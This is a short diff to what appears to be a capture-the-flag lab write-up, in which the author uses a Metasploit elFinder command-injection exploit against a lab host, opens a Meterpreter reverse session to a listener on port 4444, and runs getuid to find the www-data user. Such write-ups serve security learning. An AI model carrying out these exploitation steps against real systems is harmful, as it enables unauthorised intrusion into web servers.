@@ -70,8 +70,12 @@ Searching for an elFinder exploit on Metasploit, I find one for command injectio
 	[+] Archive was successfully created!
 	[*] Sending payload to 10.129.66.118
 	[*] Meterpreter session 1 opened (10.10.14.36:4444 -> 10.129.66.118:35816)
+
+	(Meterpreter 1)(var/www/html/files) > getuid
+	www-data
  
-What resulted was a meterpreter shell on the web server.
+What resulted was a meterpreter shell on the web server, which from there using getuid gave me my current user.
+&#x1F6A9; found **www-data***
  
 ---
  
